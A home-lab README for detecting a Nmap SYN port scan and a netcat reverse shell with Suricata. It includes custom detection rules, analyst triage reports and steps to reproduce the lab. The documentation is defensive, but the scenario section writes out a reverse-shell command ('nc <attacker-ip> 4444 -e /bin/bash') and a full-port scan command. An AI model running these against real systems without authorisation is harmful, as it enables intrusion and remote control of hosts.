# Network Intrusion Detection Lab with Suricata

A home lab demonstrating network-based intrusion detection using Suricata IDS. The lab simulates real-world attack traffic (port scanning), captures it with tcpdump, and analyses the PCAP offline using custom and community detection rules — the same workflow a SOC analyst uses when handed a suspicious network capture for investigation.

---

## Lab Architecture

```
┌─────────────────────────┐         ┌──────────────────────────────┐
│   Host Laptop (Windows) │         │   ids-target VM (Ubuntu)     │
│                         │         │                              │
│  - Nmap (attacker)      │◄───────►│  - Suricata IDS              │
│  - IP: 192.168.204.1    │VMnet1   │  - tcpdump                   │
│                         │Host-only│  - IP: 192.168.204.20        │
└─────────────────────────┘         └──────────────────────────────┘
```

**Hypervisor:** VMware Workstation Player
**Host OS:** Windows 11
**VM OS:** Ubuntu Server 22.04 LTS
**IDS Engine:** Suricata 6.0.4
**Ruleset:** Emerging Threats Community + custom rules

> Architecture note: This lab uses a single-VM host-based IDS deployment to fit within 8GB RAM constraints, while preserving the same network signatures a real detection engineer would need to identify. The host laptop acts as both the management machine and the attacker, connected to the IDS VM via a VMware Host-only network (VMnet1).

---

## Tools Used

| Tool | Purpose |
|---|---|
| Suricata 6.0.4 | IDS engine — inspects traffic against detection rules |
| tcpdump | Packet capture — records raw traffic to PCAP file |
| Nmap | Attack simulation — full TCP SYN port scan |
| Emerging Threats ruleset | 52,724 community detection signatures |
| Custom rules | Hand-written rules targeting specific attack patterns |

---

## Attack Scenarios

### Scenario 1 — TCP SYN Port Scan
**Tool:** Nmap (`nmap -sS -p- 192.168.204.20`)
**What it simulates:** An attacker performing reconnaissance by scanning all 65,535 TCP ports on a target host to discover open services before exploitation.
**MITRE ATT&CK:** T1595.001 — Active Scanning: Scanning IP Blocks

### Scenario 2 — Reverse Shell (Netcat)
**Tool:** Netcat (`nc <attacker-ip> 4444 -e /bin/bash`)
**What it simulates:** A compromised host reaching back out to an attacker-controlled listener — the classic post-exploitation callback pattern used by malware and manual attackers alike.
**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Detection Method — Offline PCAP Replay Analysis

Rather than relying solely on live detection, this lab uses **offline PCAP replay analysis** — a core SOC analyst workflow:

1. Traffic is captured live with tcpdump during the attack
2. The PCAP is replayed through Suricata offline using `suricata -r`
3. Alerts are extracted from `fast.log` and `eve.json` for analysis

This mirrors what a real analyst does when handed a suspicious network capture from a SIEM, a firewall, or a senior engineer: replay it, extract the IOCs, and document the findings.

```bash
sudo suricata -r ~/portscan_capture.pcap \
  -c /etc/suricata/suricata.yaml \
  -l ~/pcap-logs/
```

**Capture stats:**
- Total packets captured: 185,165
- Capture file size: 20MB
- Alerts generated: 61

---

## Custom Detection Rules

Located in `suricata-rules/custom.rules`

### Rule 1 — SYN Port Scan Detection
```
alert tcp any any -> $HOME_NET any (
  msg:"CUSTOM Possible SYN port scan detected";
  flags:S;
  threshold:type both, track by_src, count 20, seconds 60;
  classtype:attempted-recon;
  sid:1000001;
  rev:1;
)
```
**Logic:** Fires when a single source IP sends 20+ SYN packets within 60 seconds — the traffic pattern produced by any port scanner (Nmap, Masscan, etc.).

### Rule 2 — Reverse Shell Outbound Connection
```
alert tcp $HOME_NET any -> any 4444 (
  msg:"CUSTOM Possible reverse shell - outbound to known shell port";
  flags:S;
  classtype:trojan-activity;
  sid:1000002;
  rev:1;
)
```
**Logic:** Flags any outbound connection attempt from the internal network to port 4444 — a port commonly used by Metasploit listeners and manual netcat reverse shells.

---

## Analyst Reports

### Report 1 — SYN Port Scan

| Field | Detail |
|---|---|
| Alert | CUSTOM Possible SYN port scan detected (sid:1000001) |
| Source | 192.168.204.1 (host laptop / attacker) |
| Destination | 192.168.204.20 (ids-target VM) |
| Tool used | Nmap SYN scan (`-sS -p-`) |
| MITRE ATT&CK | T1595.001 — Active Scanning |
| Severity | Medium |

**What was observed:** A single source IP (`192.168.204.1`) sent SYN packets to all 65,535 TCP ports on the target host within a short time window. This is consistent with automated port scanning behaviour. Only port 22 (SSH) was confirmed open.

**Triage steps:**
1. Confirm source IP — is it an authorised internal scanner or an unknown host?
2. Check if any ports beyond 22 responded — if so, those open ports are potential attack surface.
3. Review subsequent traffic from that source IP for follow-up exploitation attempts.
4. Cross-reference source IP against threat intelligence feeds.

**Analyst verdict:** Reconnaissance activity consistent with pre-exploitation scanning. If source is not an authorised scanner, treat as hostile and escalate. Recommend: block source IP at perimeter if external; isolate and investigate if internal.

---

### Report 2 — Reverse Shell Callback

| Field | Detail |
|---|---|
| Alert | CUSTOM Possible reverse shell - outbound to known shell port (sid:1000002) |
| Source | 192.168.204.20 (ids-target VM / compromised host) |
| Destination | 192.168.204.1 port 4444 (attacker listener) |
| Tool used | Netcat (`nc -e /bin/bash`) |
| MITRE ATT&CK | T1059.004 — Unix Shell |
| Severity | Critical |

**What was observed:** An internal host (`192.168.204.20`) initiated an outbound TCP connection to port 4444 on an external-facing IP. Port 4444 is a well-known reverse shell port used by Metasploit's default listener and manual netcat shells. The connection pattern (outbound from victim to attacker) is consistent with a post-exploitation callback following successful compromise.

**Triage steps:**
1. Immediately isolate the source host (`192.168.204.20`) from the network.
2. Confirm whether the connection was established (SYN only, or SYN-ACK returned).
3. Review process list and running services on the source host for the shell process.
4. Check for persistence mechanisms (cron jobs, new users, modified `.bashrc`).
5. Identify how the host was initially compromised — review auth.log for prior access.

**Analyst verdict:** Critical — active post-exploitation activity. Host should be considered fully compromised. Initiate incident response: isolate, preserve memory/disk image for forensics, reset all credentials that may have been accessible from that host.

---

## Repository Structure

```
network-ids-suricata-lab/
├── README.md
├── suricata-rules/
│   └── custom.rules
├── captures/
│   └── portscan_capture.pcap
├── logs/
│   └── fast-log-excerpt.txt
└── analyst-reports/
    ├── port-scan-report.md
    └── reverse-shell-report.md
```

---

## Key Learnings

- VMware environments require `checksum-validation: no` in Suricata config — hypervisors offload checksum calculation, causing false positives on every packet otherwise
- Offline PCAP replay (`suricata -r`) is a more controlled analysis method than live detection for lab documentation — it produces reproducible results
- A full `-p-` Nmap SYN scan of all 65,535 ports generates ~185,000 packets in a VMware host-only network environment
- Writing custom rules (sid:1000001, sid:1000002) on top of the Emerging Threats community ruleset demonstrates the ability to fill detection gaps where default signatures miss attack patterns

---

## How to Reproduce

1. Set up Ubuntu Server 22.04 VM in VMware with Host-only networking
2. Install Suricata: `sudo apt install suricata -y && sudo suricata-update`
3. Set `checksum-validation: no` in `/etc/suricata/suricata.yaml`
4. Add custom rules from `suricata-rules/custom.rules`
5. Start capture: `sudo tcpdump -i ens33 -s 65535 -w capture.pcap`
6. Run Nmap scan from host: `nmap -sS -p- <VM-IP>`
7. Replay PCAP: `sudo suricata -r capture.pcap -c /etc/suricata/suricata.yaml -l logs/`
8. Review alerts: `cat logs/fast.log`
